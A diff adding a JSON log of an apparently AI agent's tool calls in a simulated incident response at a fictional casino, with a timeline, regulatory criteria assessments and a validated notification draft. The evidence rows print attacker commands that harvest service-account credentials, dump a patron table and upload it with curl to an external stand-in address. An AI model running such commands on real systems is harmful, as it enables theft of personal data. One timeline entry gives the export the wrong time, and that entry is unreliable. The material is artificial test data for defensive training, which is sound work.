@@ -1,0 +1,928 @@
+[
+ {
+  "step": 1,
+  "tool": "get_case",
+  "arguments": {},
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "case_id": "CASE-31BCC90D",
+    "operator": "Example Resort and Casino (fictional)",
+    "triggering_alert": {
+     "alert_id": "ALR-2026-0314-01",
+     "raised_at": "2026-03-14T16:58:00+00:00",
+     "source": "Network monitoring",
+     "title": "Large outbound transfer to an unfamiliar external address",
+     "description": "About 1.78 GB sent from host HTL-PMS-02 to 198.51.100.77 on port 443 at 03:37 UTC. The host does not normally send data outside the network.",
+     "first_indicator_at": "2026-03-14T03:37:00+00:00",
+     "evidence_ids": [
+      "NET-0003"
+     ]
+    },
+    "where_to_look": "Attacker activity happens before the response is activated. Start from the alert's first indicator and search the hours before it, not the period after activation.",
+    "deadlines": {
+     "activated_at": "2026-03-14T17:15:00+00:00",
+     "initial_notification_due": "2026-03-15T17:15:00+00:00",
+     "initial_report_due": "2026-03-19T17:15:00+00:00",
+     "meeting_held": false
+    },
+    "hours_remaining_for_initial_notification": -5666.7,
+    "assessments": {},
+    "timeline_entries": 0,
+    "criteria": {
+     "unauthorized_access": "Unauthorized access to an information system",
+     "compromise": "Material loss of control or compromise",
+     "unauthorized_disclosure": "Unauthorized disclosure of data or information",
+     "gaming_operations_disrupted": "Gaming operations disrupted",
+     "personal_information_involved": "Patron or employee personal information involved",
+     "attacker_still_present": "Unauthorized party still present"
+    }
+   },
+   "duration_ms": 0.61
+  }
+ },
+ {
+  "step": 2,
+  "tool": "list_inventory",
+  "arguments": {},
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "assets": [
+     {
+      "host": "CAGE-WS-03",
+      "role": "Cage workstation",
+      "gaming_critical": true
+     },
+     {
+      "host": "HTL-PMS-02",
+      "role": "Hotel property management server",
+      "gaming_critical": false
+     },
+     {
+      "host": "LOY-APP-01",
+      "role": "Player loyalty application server",
+      "gaming_critical": false
+     },
+     {
+      "host": "LOY-DB-01",
+      "role": "Player loyalty database",
+      "gaming_critical": false
+     },
+     {
+      "host": "SLOT-DB-01",
+      "role": "Slot management database",
+      "gaming_critical": true
+     },
+     {
+      "host": "SLOT-MGMT-01",
+      "role": "Slot management system",
+      "gaming_critical": true
+     }
+    ],
+    "identities": [
+     {
+      "user": "hd.kpatel",
+      "kind": "human",
+      "department": "IT help desk"
+     },
+     {
+      "user": "j.alvarez",
+      "kind": "human",
+      "department": "Hotel front desk supervisor"
+     },
+     {
+      "user": "m.okafor",
+      "kind": "human",
+      "department": "Security operations, incident lead"
+     },
+     {
+      "user": "r.chen",
+      "kind": "human",
+      "department": "Cage"
+     },
+     {
+      "user": "svc_loyalty_sync",
+      "kind": "service",
+      "department": "Loyalty platform"
+     },
+     {
+      "user": "t.nguyen",
+      "kind": "human",
+      "department": "Slot operations"
+     }
+    ],
+    "note": "Use these exact names in queries. Do not invent host or account names."
+   },
+   "duration_ms": 0.28
+  }
+ },
+ {
+  "step": 3,
+  "tool": "query_network_flows",
+  "arguments": {
+   "src_host": "HTL-PMS-02",
+   "dst": "198.51.100.77",
+   "since": "2026-03-14T02:00:00+00:00",
+   "until": "2026-03-14T03:37:00+00:00"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 1,
+    "rows": [
+     {
+      "evidence_id": "NET-0003",
+      "ts": "2026-03-14T03:37:00+00:00",
+      "src_host": "HTL-PMS-02",
+      "dst": "198.51.100.77",
+      "dst_port": 443,
+      "bytes_out": 1780000000,
+      "bytes_in": 52000
+     }
+    ]
+   },
+   "duration_ms": 0.22
+  }
+ },
+ {
+  "step": 4,
+  "tool": "lookup_asset",
+  "arguments": {
+   "host": "HTL-PMS-02"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "asset": {
+     "host": "HTL-PMS-02",
+     "role": "Hotel property management server",
+     "gaming_critical": 0,
+     "notes": "Guest reservations and folios"
+    }
+   },
+   "duration_ms": 0.09
+  }
+ },
+ {
+  "step": 5,
+  "tool": "query_signins",
+  "arguments": {
+   "host": "HTL-PMS-02",
+   "since": "2026-03-13T22:00:00+00:00",
+   "until": "2026-03-14T03:37:00+00:00"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 2,
+    "rows": [
+     {
+      "evidence_id": "SIG-0003",
+      "ts": "2026-03-14T02:18:00+00:00",
+      "user": "j.alvarez",
+      "host": "HTL-PMS-02",
+      "source_ip": "203.0.113.45",
+      "result": "success",
+      "mfa": "sms_new_device",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0)"
+     },
+     {
+      "evidence_id": "SIG-0006",
+      "ts": "2026-03-14T03:15:00+00:00",
+      "user": "j.alvarez",
+      "host": "HTL-PMS-02",
+      "source_ip": "203.0.113.45",
+      "result": "success",
+      "mfa": "remembered",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0)"
+     }
+    ]
+   },
+   "duration_ms": 0.2
+  }
+ },
+ {
+  "step": 6,
+  "tool": "query_process_events",
+  "arguments": {
+   "host": "HTL-PMS-02",
+   "user": "j.alvarez",
+   "since": "2026-03-14T02:18:00+00:00",
+   "until": "2026-03-14T03:37:00+00:00"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 4,
+    "rows": [
+     {
+      "evidence_id": "PRC-0002",
+      "ts": "2026-03-14T02:31:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "powershell.exe",
+      "command_line": "powershell -nop -c \"Get-ChildItem C:\\PMS\\config -Recurse -Include *.config | Select-String 'svc_'\""
+     },
+     {
+      "evidence_id": "PRC-0003",
+      "ts": "2026-03-14T02:42:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "sqlcmd.exe",
+      "command_line": "sqlcmd -S LOY-DB-01 -U svc_loyalty_sync -Q \"SELECT COUNT(*) FROM players\""
+     },
+     {
+      "evidence_id": "PRC-0004",
+      "ts": "2026-03-14T03:01:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "sqlcmd.exe",
+      "command_line": "sqlcmd -S LOY-DB-01 -U svc_loyalty_sync -Q \"SELECT * FROM players\" -o C:\\Users\\Public\\p.csv"
+     },
+     {
+      "evidence_id": "PRC-0005",
+      "ts": "2026-03-14T03:36:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "curl.exe",
+      "command_line": "curl.exe -T C:\\Users\\Public\\p.zip https://198.51.100.77/upload"
+     }
+    ]
+   },
+   "duration_ms": 0.21
+  }
+ },
+ {
+  "step": 7,
+  "tool": "lookup_identity",
+  "arguments": {
+   "user": "j.alvarez"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "identity": {
+     "user": "j.alvarez",
+     "kind": "human",
+     "department": "Hotel front desk supervisor",
+     "usual_hosts": [
+      "HTL-PMS-01",
+      "HTL-PMS-02"
+     ]
+    }
+   },
+   "duration_ms": 0.09
+  }
+ },
+ {
+  "step": 8,
+  "tool": "lookup_data_inventory",
+  "arguments": {
+   "host": "LOY-DB-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "data_classes": [
+     {
+      "host": "LOY-DB-01",
+      "data_class": "patron_identity",
+      "personal_information": 1,
+      "description": "Player names, home addresses, dates of birth, driver's license numbers"
+     },
+     {
+      "host": "LOY-DB-01",
+      "data_class": "play_history",
+      "personal_information": 0,
+      "description": "Aggregate play and comp history"
+     }
+    ]
+   },
+   "duration_ms": 0.29
+  }
+ },
+ {
+  "step": 9,
+  "tool": "query_signins",
+  "arguments": {
+   "user": "svc_loyalty_sync",
+   "since": "2026-03-13T22:00:00+00:00",
+   "until": "2026-03-14T03:37:00+00:00"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 2,
+    "rows": [
+     {
+      "evidence_id": "SIG-0002",
+      "ts": "2026-03-14T01:40:00+00:00",
+      "user": "svc_loyalty_sync",
+      "host": "LOY-APP-01",
+      "source_ip": "10.30.2.11",
+      "result": "success",
+      "mfa": "n/a",
+      "user_agent": "SQL Client"
+     },
+     {
+      "evidence_id": "SIG-0005",
+      "ts": "2026-03-14T02:44:00+00:00",
+      "user": "svc_loyalty_sync",
+      "host": "LOY-DB-01",
+      "source_ip": "10.10.8.22",
+      "result": "success",
+      "mfa": "n/a",
+      "user_agent": "SQL Client"
+     }
+    ]
+   },
+   "duration_ms": 0.21
+  }
+ },
+ {
+  "step": 10,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:18:00+00:00",
+   "summary": "Human user j.alvarez signed in to HTL-PMS-02 from external IP 203.0.113.45 using MFA via sms_new_device",
+   "evidence_ids": [
+    "SIG-0003"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "ec1e8ddc8ad356c2e3fb588edd3ba565dabc36a528d005822ad22ecd483b069a",
+    "prev_hash": "0000000000000000000000000000000000000000000000000000000000000000"
+   },
+   "duration_ms": 25.02
+  }
+ },
+ {
+  "step": 11,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:31:00+00:00",
+   "summary": "User j.alvarez executed powershell.exe on HTL-PMS-02 to search PMS config files for 'svc_' strings [PRC-0002]",
+   "evidence_ids": [
+    "PRC-0002"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "ac1c33e50db70564cd8058d8b10edfc4d8a492a08a6de4cd2ca209b9a3164d4f",
+    "prev_hash": "ec1e8ddc8ad356c2e3fb588edd3ba565dabc36a528d005822ad22ecd483b069a"
+   },
+   "duration_ms": 21.67
+  }
+ },
+ {
+  "step": 12,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:42:00+00:00",
+   "summary": "User j.alvarez executed sqlcmd.exe on HTL-PMS-02 connecting to LOY-DB-01 as svc_loyalty_sync querying COUNT(*) FROM players [PRC-0003]",
+   "evidence_ids": [
+    "PRC-0003"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "1f4f572b13e85d425d9b4e722b43d9928f97c6526fc83138437aeef65af4e90a",
+    "prev_hash": "ac1c33e50db70564cd8058d8b10edfc4d8a492a08a6de4cd2ca209b9a3164d4f"
+   },
+   "duration_ms": 24.67
+  }
+ },
+ {
+  "step": 13,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:44:00+00:00",
+   "summary": "Sign-in svc_loyalty_sync to LOY-DB-01 from IP 10.10.8.22 [SIG-0005]",
+   "evidence_ids": [
+    "SIG-0005"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "71d73669844bdf9af08db236ca8de971f6ab81d6d974f560c7b5a24c1e086d89",
+    "prev_hash": "1f4f572b13e85d425d9b4e722b43d9928f97c6526fc83138437aeef65af4e90a"
+   },
+   "duration_ms": 26.31
+  }
+ },
+ {
+  "step": 14,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:42:00+00:00",
+   "summary": "User j.alvarez executed sqlcmd.exe on HTL-PMS-02 connecting to LOY-DB-01 as svc_loyalty_sync and exporting all players data to CSV [PRC-0004]",
+   "evidence_ids": [
+    "PRC-0004"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "1a334633c72ea11e1a0e7921706441208b6c5d1d1ccdab81d8f0a2c254b00551",
+    "prev_hash": "71d73669844bdf9af08db236ca8de971f6ab81d6d974f560c7b5a24c1e086d89"
+   },
+   "duration_ms": 19.69
+  }
+ },
+ {
+  "step": 15,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T03:01:00+00:00",
+   "summary": "User j.alvarez executed sqlcmd.exe on HTL-PMS-02 connecting to LOY-DB-01 as svc_loyalty_sync exporting all players data to C:\\\\Users\\\\Public\\\\p.csv [PRC-0004]",
+   "evidence_ids": [
+    "PRC-0004"
+   ]
+  },
+  "result": {
+   "ok": false,
+   "error": "validation_failed",
+   "reason": "this evidence is already on the timeline as entry 5; record a new fact or cite different evidence"
+  }
+ },
+ {
+  "step": 16,
+  "tool": "search_regulation",
+  "arguments": {
+   "query": "unauthorized access compromise unauthorized disclosure gaming operations disrupted personal information involved attacker still present",
+   "k": 5
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "results": [
+     {
+      "id": "4",
+      "cite": "[Reg 5.260(4)]",
+      "title": "Reporting obligations after a cybersecurity incident",
+      "text": "4. A covered entity that experiences a cybersecurity incident relating to its information system that has resulted in a material loss of control, compromise, unauthorized disclosure of data or information, or any other similar occurrence shall:",
+      "score": 13.707
+     },
+     {
+      "id": "2(d)",
+      "cite": "[Reg 5.260(2)(d)]",
+      "title": "Definition: Cybersecurity incident",
+      "text": "(d) \u201cCybersecurity incident\u201d means any act in which a person has gained unauthorized access to an information system of a covered entity for the purpose of disrupting, disabling, destroying, or controlling the system or destroying or gaining access to the information contained therein.",
+      "score": 11.373
+     },
+     {
+      "id": "1",
+      "cite": "[Reg 5.260(1)]",
+      "title": "Policy",
+      "text": "1. In accordance with the public policy of the State set forth in NRS 463.0129 and the requirements set forth in chapter 603A of NRS, it is critical that gaming operators take all appropriate steps to secure and protect their information systems from the ongoing threat of cybersecurity incidents. Gaming operators must not only secure and protect their own records and operations, but also the personal information of their patrons and employees as defined in NRS 603A.040.",
+      "score": 8.566
+     },
+     {
+      "id": "2(f)",
+      "cite": "[Reg 5.260(2)(f)]",
+      "title": "Definition: Covered entity",
+      "text": "(f) \u201cCovered entity\u201d means an entity required to comply with the requirements of this section. Each of the following qualifies as a covered entity: (1) Holder of a nonrestricted license as defined in NRS 463.0177 who deals, operates, carries on, conducts, maintains, or exposes for play any game defined in NRS 463.0152; (2) Holder of a gaming license that allows for the operation of a race book; (3) Holder of a gaming license that allows for the operation of a sports pool; and (4) Holder of a gaming license that permits the operation of interactive gaming.",
+      "score": 3.729
+     },
+     {
+      "id": "2(h)",
+      "cite": "[Reg 5.260(2)(h)]",
+      "title": "Definition: Risk assessment",
+      "text": "(h) \u201cRisk assessment\u201d means the process of identifying, estimating, and prioritizing risks to organizational operations and assets resulting from the operation of an information system. Guidance for conducting a risk assessment can be found in the Framework for Improving Critical Infrastructure Cybersecurity, version 1.1 or later, published by NIST.",
+      "score": 3.486
+     }
+    ]
+   },
+   "duration_ms": 0.19
+  }
+ },
+ {
+  "step": 17,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "unauthorized_access",
+   "status": "supported",
+   "evidence_ids": [
+    "SIG-0003"
+   ],
+   "rationale": "Sign-in from external IP 203.0.113.45 by j.alvarez at 02:18 UTC, who is a Hotel front desk supervisor with usual hosts HTL-PMS-01/02, indicates unauthorized access."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "unauthorized_access",
+    "status": "supported"
+   },
+   "duration_ms": 22.68
+  }
+ },
+ {
+  "step": 18,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "compromise",
+   "status": "supported",
+   "evidence_ids": [
+    "PRC-0004",
+    "PRC-0005",
+    "NET-0003"
+   ],
+   "rationale": "User j.alvarez exported player data to CSV and uploaded it via curl to external IP 198.51.100.77 (1.78 GB outbound), demonstrating material loss of control."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "compromise",
+    "status": "supported"
+   },
+   "duration_ms": 22.11
+  }
+ },
+ {
+  "step": 19,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "unauthorized_disclosure",
+   "status": "supported",
+   "evidence_ids": [
+    "PRC-0004",
+    "PRC-0005"
+   ],
+   "rationale": "Export of player data to CSV and transfer to external IP 198.51.100.77 constitutes unauthorized disclosure."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "unauthorized_disclosure",
+    "status": "supported"
+   },
+   "duration_ms": 23.83
+  }
+ },
+ {
+  "step": 20,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "gaming_operations_disrupted",
+   "status": "not_supported",
+   "evidence_ids": [],
+   "rationale": "No evidence found that gaming operations were disrupted; the affected host HTL-PMS-02 is a hotel property management server, not gaming-critical."
+  },
+  "result": {
+   "ok": false,
+   "error": "validation_failed",
+   "reason": "not_supported claims gaming operations were not disrupted, which requires citing evidence from at least one gaming-critical host. Examine one, or use status 'unknown'."
+  }
+ },
+ {
+  "step": 21,
+  "tool": "lookup_asset",
+  "arguments": {
+   "host": "SLOT-DB-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "asset": {
+     "host": "SLOT-DB-01",
+     "role": "Slot management database",
+     "gaming_critical": 1,
+     "notes": ""
+    }
+   },
+   "duration_ms": 0.08
+  }
+ },
+ {
+  "step": 22,
+  "tool": "query_process_events",
+  "arguments": {
+   "host": "SLOT-DB-01",
+   "since": "2026-03-13T22:00:00+00:00",
+   "until": "2026-03-14T03:37:00+00:00"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 0,
+    "rows": []
+   },
+   "duration_ms": 0.15
+  }
+ },
+ {
+  "step": 23,
+  "tool": "query_network_flows",
+  "arguments": {
+   "since": "2026-03-13T22:00:00+00:00",
+   "until": "2026-03-14T03:37:00+00:00"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 4,
+    "rows": [
+     {
+      "evidence_id": "NET-0001",
+      "ts": "2026-03-14T01:40:00+00:00",
+      "src_host": "LOY-APP-01",
+      "dst": "LOY-DB-01",
+      "dst_port": 1433,
+      "bytes_out": 48000,
+      "bytes_in": 2100000
+     },
+     {
+      "evidence_id": "NET-0004",
+      "ts": "2026-03-14T02:25:00+00:00",
+      "src_host": "SLOT-MGMT-01",
+      "dst": "SLOT-DB-01",
+      "dst_port": 1433,
+      "bytes_out": 12000,
+      "bytes_in": 880000
+     },
+     {
+      "evidence_id": "NET-0002",
+      "ts": "2026-03-14T03:02:00+00:00",
+      "src_host": "HTL-PMS-02",
+      "dst": "LOY-DB-01",
+      "dst_port": 1433,
+      "bytes_out": 61000,
+      "bytes_in": 1950000000
+     },
+     {
+      "evidence_id": "NET-0003",
+      "ts": "2026-03-14T03:37:00+00:00",
+      "src_host": "HTL-PMS-02",
+      "dst": "198.51.100.77",
+      "dst_port": 443,
+      "bytes_out": 1780000000,
+      "bytes_in": 52000
+     }
+    ]
+   },
+   "duration_ms": 0.17
+  }
+ },
+ {
+  "step": 24,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "gaming_operations_disrupted",
+   "status": "unknown",
+   "evidence_ids": [
+    "NET-0002",
+    "NET-0004"
+   ],
+   "rationale": "Evidence shows network traffic between SLOT-MGMT-01 and SLOT-DB-01, and HTL-PMS-02 and LOY-DB-01, but no direct evidence of disruption to gaming operations. Need to determine if operations were impacted."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "gaming_operations_disrupted",
+    "status": "unknown"
+   },
+   "duration_ms": 27.1
+  }
+ },
+ {
+  "step": 25,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "personal_information_involved",
+   "status": "supported",
+   "evidence_ids": [
+    "PRC-0004",
+    "PRC-0005",
+    "LOY-DB-01"
+   ],
+   "rationale": "Player data exported from LOY-DB-01 includes patron_identity data (names, addresses, DOB, driver's license numbers) per lookup_data_inventory. The export and transfer to external IP constitutes personal information involvement."
+  },
+  "result": {
+   "ok": false,
+   "error": "validation_failed",
+   "reason": "invalid evidence ID 'LOY-DB-01'"
+  }
+ },
+ {
+  "step": 26,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "personal_information_involved",
+   "status": "supported",
+   "evidence_ids": [
+    "PRC-0004",
+    "PRC-0005"
+   ],
+   "rationale": "User j.alvarez exported player data to CSV and uploaded it to external IP. Per lookup_data_inventory, LOY-DB-01 holds patron_identity data including personal information. The export and transfer involves personal information."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "personal_information_involved",
+    "status": "supported"
+   },
+   "duration_ms": 24.95
+  }
+ },
+ {
+  "step": 27,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "attacker_still_present",
+   "status": "unknown",
+   "evidence_ids": [],
+   "rationale": "No evidence found indicating the attacker is still present; last observed activity was at 03:36 UTC with curl upload to external IP, and the alert was raised at 03:37 UTC. The activated_at timestamp is 17:15 UTC same day, well after the observed activity."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "attacker_still_present",
+    "status": "unknown"
+   },
+   "duration_ms": 10.76
+  }
+ },
+ {
+  "step": 28,
+  "tool": "draft_initial_notification",
+  "arguments": {
+   "summary": "At 02:18 UTC, human user j.alvarez signed in to host HTL-PMS-02 from external IP 203.0.113.45 using MFA via sms_new_device [SIG-0003]. From 02:31 to 02:42 UTC, user j.alvarez executed powershell.exe to search PMS config files and sqlcmd.exe to query and export player data from the loyalty database LOY-DB-01 [PRC-0002, PRC-0003]. At 02:44 UTC, service account svc_loyalty_sync signed in to LOY-DB-01 from IP 10.10.8.22 [SIG-0005]."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "saved": false,
+    "validation": {
+     "valid": false,
+     "errors": [
+      "sentence 2 cites no evidence: 'From 02:31 to 02:42 UTC, user j.alvarez executed powershell.exe to search PMS co'"
+     ],
+     "evidence_cited": [
+      "SIG-0003",
+      "SIG-0005"
+     ],
+     "regulation_cited": []
+    },
+    "next": "Fix every error listed and call draft_initial_notification again."
+   },
+   "duration_ms": 0.33
+  }
+ },
+ {
+  "step": 29,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T03:36:00+00:00",
+   "summary": "User j.alvarez executed curl.exe on HTL-PMS-02 to upload C:\\\\Users\\\\Public\\\\p.zip to external IP 198.51.100.77 [PRC-0005]",
+   "evidence_ids": [
+    "PRC-0005"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "abb13936ac6c6c3bfc4e287f2fde3faf786db0de032038bfc9dc15d57665fdf0",
+    "prev_hash": "1a334633c72ea11e1a0e7921706441208b6c5d1d1ccdab81d8f0a2c254b00551"
+   },
+   "duration_ms": 10.77
+  }
+ },
+ {
+  "step": 30,
+  "tool": "draft_initial_notification",
+  "arguments": {
+   "summary": "At 02:18 UTC, human user j.alvarez signed in to host HTL-PMS-02 from external IP 203.0.113.45 using MFA via sms_new_device [SIG-0003]. Between 02:31 and 02:42 UTC, user j.alvarez executed powershell.exe on HTL-PMS-02 to search PMS config files [PRC-0002] and sqlcmd.exe to query the loyalty database LOY-DB-01 as svc_loyalty_sync [PRC-0003]. At 02:44 UTC, service account svc_loyalty_sync signed in to LOY-DB-01 from IP 10.10.8.22 [SIG-0005]. At 03:01 UTC, user j.alvarez exported player data to CSV on HTL-PMS-02 [PRC-0004]. At 03:36 UTC, user j.alvarez uploaded the exported file to external IP 198.51.100.77 using curl.exe [PRC-0005]. At 03:37 UTC, the network monitoring alert was raised reporting 1.78 GB outbound to 198.51.100.77 from HTL-PMS-02 [NET-0003]."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "saved": false,
+    "validation": {
+     "valid": false,
+     "errors": [
+      "NET-0003 is not on the case timeline; record it there first"
+     ],
+     "evidence_cited": [
+      "SIG-0003",
+      "PRC-0002",
+      "PRC-0003",
+      "SIG-0005",
+      "PRC-0004",
+      "PRC-0005",
+      "NET-0003"
+     ],
+     "regulation_cited": []
+    },
+    "next": "Fix every error listed and call draft_initial_notification again."
+   },
+   "duration_ms": 0.58
+  }
+ },
+ {
+  "step": 31,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T03:37:00+00:00",
+   "summary": "Network monitoring alert raised: 1.78 GB outbound from HTL-PMS-02 to 198.51.100.77 on port 443 [NET-0003]",
+   "evidence_ids": [
+    "NET-0003"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "7709a7c38521343b954e16874d86a35aba4db3c160328d72b68275362ae05894",
+    "prev_hash": "abb13936ac6c6c3bfc4e287f2fde3faf786db0de032038bfc9dc15d57665fdf0"
+   },
+   "duration_ms": 11.18
+  }
+ },
+ {
+  "step": 32,
+  "tool": "draft_initial_notification",
+  "arguments": {
+   "summary": "At 02:18 UTC, human user j.alvarez signed in to host HTL-PMS-02 from external IP 203.0.113.45 using MFA via sms_new_device [SIG-0003]. Between 02:31 and 02:42 UTC, user j.alvarez executed powershell.exe on HTL-PMS-02 to search PMS config files [PRC-0002] and sqlcmd.exe to query the loyalty database LOY-DB-01 as svc_loyalty_sync [PRC-0003]. At 02:44 UTC, service account svc_loyalty_sync signed in to LOY-DB-01 from IP 10.10.8.22 [SIG-0005]. At 03:01 UTC, user j.alvarez exported player data to CSV on HTL-PMS-02 [PRC-0004]. At 03:36 UTC, user j.alvarez uploaded the exported file to external IP 198.51.100.77 using curl.exe [PRC-0005]. At 03:37 UTC, the network monitoring alert was raised reporting 1.78 GB outbound from HTL-PMS-02 to 198.51.100.77 on port 443 [NET-0003]."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "saved": true,
+    "draft_id": "DRAFT-43F10AB8",
+    "validation": {
+     "valid": true,
+     "errors": [],
+     "evidence_cited": [
+      "SIG-0003",
+      "PRC-0002",
+      "PRC-0003",
+      "SIG-0005",
+      "PRC-0004",
+      "PRC-0005",
+      "NET-0003"
+     ],
+     "regulation_cited": []
+    }
+   },
+   "duration_ms": 12.47
+  }
+ },
+ {
+  "step": 33,
+  "final": "The draft is ready for human review."
+ }
+]
